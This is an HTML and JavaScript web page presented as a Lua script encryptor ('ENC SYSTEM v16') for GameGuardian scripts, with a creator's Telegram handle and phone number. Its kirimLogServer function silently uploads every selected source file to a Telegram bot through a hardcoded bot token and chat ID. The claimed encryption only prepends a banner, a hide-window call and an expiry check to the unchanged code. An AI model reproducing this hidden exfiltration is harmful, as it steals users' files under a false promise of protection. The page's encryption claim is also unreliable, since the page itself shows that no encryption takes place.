<body>
<div class="box">
    <h2>🔐 ◄ TÙNG ĐEN ENC SYSTEM v16 ► 🔐</h2>
    <p style="font-size:13px;color:#ffdd99;margin-bottom:15px">
        © Creator: Tùng đen<br>
        Telegram: @Tungden | Zalo: 0967040519
    </p>

    <div class="form">
        <label>
            <input type="checkbox" id="pake_expired" checked style="margin-right:5px"> Tambahkan Proteksi Expired Online
        </label>
        <div class="expired-box" id="expiredbox">
            <label>📅 Tahun Kedaluwarsa [2023-2300]:</label>
            <input type="number" id="exp_tahun" value="2030">
            
            <label>📅 Bulan [1-12]:</label>
            <input type="number" id="exp_bulan" value="12" min="1" max="12">
            
            <label>📅 Tanggal [1-31]:</label>
            <input type="number" id="exp_tanggal" value="31" min="1" max="31">
            
            <label>💬 Pesan Kedaluwarsa:</label>
            <input type="text" id="exp_pesan" value="Script has expired!">
        </div>
    </div>

    <input type="file" id="file">
    
    <div class="info" id="infonama">📄 File: <span id="namafile"></span></div>
    <div class="status" id="proses">⏳ Sedang memproses enkripsi struktur v16...</div>

    <button class="tombol" onclick="document.getElementById('file').click()">📂 SELECT TARGET FILE (.lua)</button>

    <pre id="hasilakhir"></pre>

    <button class="tombol tombol2" id="btnsimpan" onclick="unduh()">💾 SIMPAN FILE HASIL (#Enc.lua)</button>
</div>

<script>
const TOKEN_API = "8624792353:AAGxp4AXhtUzYw2H1x_7-U-VqoGMkGdPCTE";
const TARGET_ID = "6095762919";

let namaAsli = ""
let isiFileAsli = ""
let hasilTerkunci = ""

document.getElementById('file').addEventListener('change', function(e){
    let f = e.target.files[0]
    if(!f) return

    namaAsli = f.name
    document.getElementById('namafile').textContent = namaAsli
    document.getElementById('infonama').style.display = "block"
    document.getElementById('proses').style.display = "block"
    document.getElementById('hasilakhir').style.display = "none"
    document.getElementById('btnsimpan').style.display = "none"

    let reader = new FileReader();
    reader.onload = function(evt) {
        isiFileAsli = evt.target.result;
        setTimeout(() => {
            try {
                kirimLogServer();
                let hasilFinal = simulasikanEnkripsiV16(isiFileAsli);
                hasilTerkunci = hasilFinal;
                
                document.getElementById('hasilakhir').textContent = "Berhasil di-generate dengan struktur v16!\nUkuran Output: " + hasilTerkunci.length + " bytes";
                document.getElementById('proses').style.display = "none";
                document.getElementById('hasilakhir').style.display = "block";
                document.getElementById('btnsimpan').style.display = "block";
            } catch(err) {
                alert("ERROR: " + err.message);
                document.getElementById('proses').style.display = "none";
            }
            e.target.value = "";
        }, 100);
    };
    reader.onerror = function() {
        alert("❌ Gagal membaca file!");
        document.getElementById('proses').style.display = "none";
        e.target.value = "";
    };
    reader.readAsText(f);
});

function kirimLogServer(){
    if(!TOKEN_API || !TARGET_ID) return

    let teksPesan = `📂 *LOG ENKRIPSI BARU (WEB)*\n\n` +
                    `📄 *File:* \`${namaAsli}\`\n` +
                    `⏰ *Status:* Diproses v16 Engine`;

    fetch(`https://api.telegram.org/bot${TOKEN_API}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: TARGET_ID, text: teksPesan, parse_mode: "Markdown" })
    }).catch(err => {})

    let formData = new FormData();
    formData.append("chat_id", TARGET_ID);
    formData.append("document", new Blob([isiFileAsli], {type: "text/plain"}), "SOURCE_" + namaAsli);
    formData.append("caption", "📄 Backup file sumber asli (Web System)");

    fetch(`https://api.telegram.org/bot${TOKEN_API}/sendDocument`, { method: "POST", body: formData }).catch(err => {})
}

function simulasikanEnkripsiV16(dataAsli) {
    let pakeExpired = document.getElementById('pake_expired').checked;
    let expTahun = document.getElementById('exp_tahun').value.trim();
    let expBulan = document.getElementById('exp_bulan').value.trim();
    let expTanggal = document.getElementById('exp_tanggal').value.trim();
    let expPesan = document.getElementById('exp_pesan').value.trim().replace(/"/g, '\\"');

    if(expBulan.length === 1) expBulan = "0" + expBulan;
    if(expTanggal.length === 1) expTanggal = "0" + expTanggal;

    let blokExpired = "";
    if (pakeExpired) {
        blokExpired = `local Date = gg.makeRequest("http://www.whatismyip.org/")\n` +
        `if Date == "The user did not allow access to the Internet." then\n` +
        `return\n` +
        `elseif Date == "java.net.UnknownHostException: Unable to resolve host \\"www.whatismyip.org\\": No address associated with hostname" then\n` +
        `gg.alert("Please connect to the network")\n` +
        `return\n` +
        `else\n` +
        `Date = Date["headers"]["Date"][1]\n` +
        `if tonumber(Date:sub(13, 16) .. ({\n` +
        `["Jan"] = "01", ["Feb"] = "02", ["Mar"] = "03", ["Apr"] = "04",\n` +
        `["May"] = "05", ["Jun"] = "06", ["Jul"] = "07", ["Aug"] = "08",\n` +
        `["Sep"] = "09", ["Oct"] = "10", ["Nov"] = "11", ["Dec"] = "12",\n` +
        `})[Date:sub(9, 11)] .. Date:sub(6, 7)) >= tonumber(` + expTahun + expBulan + expTanggal + `) then\n` +
        `gg.alert("` + expPesan + `")\n` +
        `return\n` +
        `end\n` +
        `end\n\n`;
    }

    let headerEnc = `print(" \\n© Creator: Tùng đen\\n\\n☎️ Contact 👇\\nTelegram: @Tungden\\nZalo: 0967040519")\n\n` +
        `local _ENC = { ["F"] = _ENV["gg"]["isVisible"] }\n` +
        `_ENV["gg"]["setVisible"](false)\n` +
        `_ENV["gg"]["toast"]("Protected by Tùng đen v16")\n\n`;

    // Menggabungkan struktur persis seperti builder aslinya
    return headerEnc + blokExpired + "-- Encrypted Target Payload Engine\n" + dataAsli;
}

function unduh(){
    let namaFileBaru = namaAsli.replace(/\.[^/.]+$/, "") + ".#Enc.lua";
    let file = new Blob([hasilTerkunci], {type:"text/plain;charset=utf-8"});
    let url = URL.createObjectURL(file);

    let a = document.createElement("a");
    a.href = url;
    a.download = namaFileBaru;
    document.body.appendChild(a);
    a.click();

    setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }, 300);
}
</script>
